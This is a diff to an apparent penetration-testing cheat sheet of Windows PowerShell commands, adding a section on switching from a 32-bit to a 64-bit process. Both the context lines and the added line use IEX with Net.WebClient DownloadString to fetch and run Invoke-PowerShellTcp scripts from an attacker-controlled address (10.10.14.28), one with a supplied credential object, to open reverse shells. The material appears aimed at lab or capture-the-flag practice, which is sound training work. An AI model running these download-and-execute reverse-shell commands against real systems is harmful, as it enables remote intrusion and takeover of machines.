@@ -51,6 +51,15 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');} -Credential $cred -Computer localhost
 
 ==============================================================================
+[+] Change Process 32 to 64 bits
+==============================================================================
+[Environment]::Is64BitOperatingSystem
+[Environment]::Is64BitProcess
+
+start /b c:\Windows\SysNative\WindowsPowerShell\v1.0\powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp3.ps1');
+
+
+==============================================================================
 [+] Transfer files SMB
 ==============================================================================
 # whith Password
